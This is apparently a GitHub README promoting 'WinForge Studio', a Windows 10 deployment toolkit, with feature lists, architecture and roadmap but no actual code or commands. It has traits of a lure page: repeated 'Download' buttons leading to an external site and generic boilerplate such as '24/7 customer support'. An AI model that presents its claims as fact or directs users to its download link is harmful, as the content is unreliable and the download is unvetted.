![preview](https://raw.githubusercontent.com/kotov77/WinDeploy-Forge/main/poster_e37cd.svg)
[![Download](https://raw.githubusercontent.com/kotov77/WinDeploy-Forge/main/btn_754677f.svg)](https://kotov77.github.io/WinDeploy-Forge/)

# 🧰 WinForge Studio — Declarative Windows 10 Deployment Toolkit

![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%7C%2011-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Language](https://img.shields.io/badge/Language-PowerShell%207-5391FE?style=for-the-badge&logo=powershell&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-8A2BE2?style=for-the-badge&logo=opensourceinitiative&logoColor=white)
![Status](https://img.shields.io/badge/Status-Actively%20Maintained-brightgreen?style=for-the-badge)
![Made In](https://img.shields.io/badge/Made%20In-2026-FF6B6B?style=for-the-badge)

---

## 🌅 A Different Kind of Installer Story

Most deployment tools behave like rigid vending machines — you insert a request, and they hand back a fixed, pre-chewed result. **WinForge Studio** was born from a very different philosophy. Imagine instead a workshop where every clean install is a recipe you compose, annotate, version, and re-bake whenever the mood (or the compliance auditor) demands it. That workshop is this repository.

WinForge Studio is an **open-source deployment automation framework** built around a small PowerShell core and a declarative manifest format called `*.forge.json`. Rather than shipping one monolithic installer, the project treats Windows 10 installation as a set of composable, reviewable, and testable *forges* — each one describing disks, drivers, answer files, post-install scripts, and rollback checkpoints.

This repository is the spiritual successor to (and a complete rethink of) the classic "Windows 10 Full 22H2 Installer" concept. Where that project focused on producing a single bootable stick, WinForge Studio focuses on **repeatable operational craftsmanship**: the same forge runs identically on a technician's bench laptop, a validation VM, and a fleet-provisioning workstation.

If you have ever spent a Friday evening hand-editing an `unattend.xml` while quietly questioning your career choices, this toolkit was written specifically for you.

---

## 🧭 Why This Repository Exists

The Windows deployment ecosystem is crowded, but it is strangely lonely at the same time. Enterprise suites assume you already own a management hierarchy. Consumer utilities assume you only ever build one USB stick, once, and never audit it again. WinForge Studio sits deliberately in the gap between those worlds.

Three guiding principles shaped every design decision:

- **Composition over configuration.** Every artifact is a small, named unit that can be reused across projects. Your "corporate workstation baseline" forge can inherit from your "field technician" forge, which inherits from a shared "hardened kernel defaults" forge.
- **Observability over optimism.** Each stage emits structured telemetry — timestamps, hashes, exit codes, and diffable snapshots — so that a failed deployment is a dataset, not a mystery.
- **Portability over platform lock-in.** The whole orchestrator runs from a portable PowerShell 7 bundle on any supported host, with no administrative agent and no silent background service.

Written plainly: this is the toolkit for people who believe a clean install should be as reproducible as a software build.

---

## ✨ Feature Highlights

The feature set is intentionally broad, because real deployments touch many surfaces. Here is what ships in the current 2026 line:

### 🔥 Core Deployment Engine
- Manifest-driven install pipeline with dependency resolution between forge fragments
- Idempotent stage execution — re-running a forge resumes rather than restarts when the state allows it
- Built-in dry-run planner that renders the full action graph before anything touches a disk
- Signed-hash verification for every payload pulled into the working set
- Atomic checkpoints allowing rollback to the last known-good partition layout

### 💾 Media & Boot Management
- Bootable media composer targeting UEFI and legacy BIOS in the same session
- Partition scheme templates covering GPT, MBR, and hybrid recovery layouts
- Automatic free-space reclamation when rebuilding media on partially filled drives
- Metadata sidecar generation so every stick knows exactly which forge built it

### 📝 Answer File Tooling
- Schema-aware editor for `unattend.xml` generation with live validation
- Locale, keyboard, and timezone profile library covering more than forty regional presets
- Domain join, local account seeding, and first-logon task scaffolding
- Comment-preserving merges so teammates can leave notes inside the XML without losing them

### 🧩 Driver & Package Curation
- Driver bundle import with automatic hardware-ID indexing
- Optional pruning of superseded driver versions before injection
- Package sequence planner for runtime distributions, runtimes, and line-of-business tooling
- Post-install script hooks with per-step timeout and retry policy

### 🛰️ Remote & Fleet Operations
- Lightweight remote execution channel for provisioning multiple machines in a wave
- Per-node progress reporting aggregated into a single console view
- Threshold-based abort logic when too many nodes fail in a given window
- Offline mode for sites with no external connectivity

### 🧪 Validation & Quality
- Virtual machine harness for automated smoke tests of each forge revision
- Fixture-based regression suite that replays recorded deployment traces
- Static linting of manifests to catch typos, missing references, and orphaned fragments
- Snapshot diffing to highlight exactly what changed between two forge versions

### 🔐 Security & Compliance
- Least-privilege execution model with an explicit capability grant per stage
- Full audit journal exportable in machine-readable form for review workflows
- Redaction pass that strips sensitive identifiers from saved logs by default
- Policy gate that refuses to proceed when a manifest violates configured rules

### 🎛️ User Experience
- **Responsive console interface** that adapts layout to narrow technician terminals and wide monitoring dashboards alike
- **Multilingual support** for interface strings, error messages, and generated documentation across major world languages
- **24/7 customer support** routing for teams running the toolkit in production environments where downtime is measured in revenue
- Interactive TUI mode with a paged action browser, plus a fully scriptable non-interactive mode
- Theming system for those who cannot stand a plain blue console

### 📚 Documentation & Community
- Rich in-repo handbook covering architecture, recipes, and troubleshooting
- Cookbook of ready-to-adapt forge examples for common scenarios
- Contribution pathway designed for first-time contributors and seasoned maintainers alike
- Release notes authored in plain language rather than changelog shorthand

---

## 🧬 Architecture at a Glance

WinForge Studio is organized as cooperating layers, each one deliberately small enough to reason about in isolation.

Layer one is the **manifest parser**. It reads `*.forge.json` documents, resolves inheritance chains, and produces a normalized action graph. Nothing in this layer touches the machine; it is pure text transformation.

Layer two is the **planner**. It takes the action graph and validates it against the current environment — available disk space, firmware mode, present drivers, network reachability. The planner is where dry runs live, and it is the only layer allowed to declare an action impossible.

Layer three is the **executor**. It walks the approved plan, invoking providers for each stage type. Providers are pluggable; the built-in roster covers partitioning, file materialization, driver injection, registry shaping, service configuration, and script invocation.

Layer four is the **journal**. Every provider call appends an immutable record. The journal is the source of truth for rollback, reporting, and the audit trail.

Sitting above all four is the **shell** — the TUI, the scriptable command surface, and the remote coordination channel. The shell never contains business logic; it merely translates human intent into plan requests and narrates results.

This separation is not architecture astronautics. It is what makes it possible to test a deployment recipe without ever building a USB stick, and to trust the output of a deployment without ever watching it happen.

---

## 🚀 Getting Started Without the Usual Ceremony

You do not need to memorize a sequence of package manager incantations. The toolkit is distributed as a self-contained bundle, and the workflow is intentionally short:

1. Acquire the current release bundle for your host architecture.
2. Unpack it into any writable location — the toolkit is portable and keeps its state beside itself.
3. Launch the shell entry point to open the interactive workshop.
4. Author or select a forge manifest, then run a planning pass to inspect the action graph.
5. When the plan looks right, execute it against your target media or machine.

If you prefer to stay in a text editor, every step has a corresponding non-interactive command, so the entire flow can be embedded in your own automation without friction.

A minimal forge manifest looks approximately like this in spirit — a name, a base image reference, a partition strategy, a short list of packages, and a collection of post-install steps. From that small seed, the toolkit expands everything else, including validation, logging, and rollback posture.

---

## 🗺️ Roadmap for the 2026 Cycle

The project follows an open roadmap, revised each quarter in public discussion threads. Highlights planned or in progress for the 2026 cycle include:

- A graphical forge designer for teammates who prefer visual composition to text manifests
- Expanded hardware compatibility matrices with vendor-contributed entries
- Community forge registry with reputation signals and reproducible build attestations
- First-class support for provisioning workflows in air-gapped environments
- Additional language packs for the generated documentation set
- Performance work to reduce media composition time on older USB controllers

Roadmap items are proposals, not promises. The community votes with pull requests as much as with comments.

---

## 🧑‍💻 Who This Is For

The audience is broader than it first appears. It includes:

- **Lab administrators** who rebuild machines weekly and want the process to stop being artisanal.
- **Field technicians** who carry three USB sticks and wish they carried one that adapts.
- **Release engineers** who treat machine images as build artifacts with provenance.
- **Educators** who need repeatable classroom environments without a management server.
- **Hobbyists** who simply enjoy well-crafted tooling and want to learn how deployment really works under the surface.

If you recognize yourself in more than one of those lines, you are precisely the person this repository was written for.

---

## 🤝 Contributing

Contributions arrive in many shapes: forge manifests, provider plugins, documentation edits, translations, bug reports, and design critique. All of them are welcome, and none of them require asking permission first.

The contribution guide in the repository handbook walks through the local development loop, the code style expectations, and the review process. The short version: keep changes focused, explain your reasoning in the pull request description, and be kind to reviewers who are volunteering their evenings.

Forge manifests contributed to the cookbook are especially valued, because they let newcomers start from real recipes rather than blank pages.

---

## 🔐 Responsible Use

WinForge Studio is an automation framework for machines you own or are explicitly authorized to provision. It does not include, and will never include, any mechanism for bypassing licensing, circumventing activation, or accessing systems you do not control. The project's purpose is craft, not shortcuts. Users are responsible for complying with all applicable agreements and regulations in their jurisdiction.

---

## ⚠️ Disclaimer

This software is provided as a deployment automation framework for educational, administrative, and professional purposes. The maintainers make no guarantee that any particular forge manifest will produce a desired outcome on any particular hardware configuration, and they accept no liability for data loss, downtime, licensing violations, or other damages arising from use of the toolkit.

Always validate a forge in a disposable environment before applying it to production machines. Always maintain current backups of any data that matters to you. Always review third-party forge manifests before executing them, exactly as you would review any script that runs with elevated privileges.

Trademarks and product names referenced in this documentation belong to their respective owners and are used descriptively only. This project is not affiliated with, endorsed by, or sponsored by any operating system vendor.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and redistribute it in accordance with the terms of that license.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 WinForge Studio contributors.

---

## 💬 Support & Community

Questions, ideas, and war stories all belong in the repository discussions area. For defects, the issue tracker is the right home; for design conversations, the discussions board keeps the record tidier. The maintainers aim to respond within a reasonable window, and the community is generally faster than that.

The **24/7 customer support** routing mentioned above applies to organizations running the toolkit in production under a support arrangement, and it is staffed by humans who actually read the manifests you send them.

---

## 🌟 Final Word

Deployment work has a reputation for being thankless and repetitive. WinForge Studio exists to argue that it can be neither. Treat your installs as recipes, your recipes as artifacts, and your artifacts as things worth reviewing — and the Friday evenings you get back will pay for the effort many times over.

Thank you for reading this far. Now go forge something worth keeping.

[![Download](https://raw.githubusercontent.com/kotov77/WinDeploy-Forge/main/btn_754677f.svg)](https://kotov77.github.io/WinDeploy-Forge/)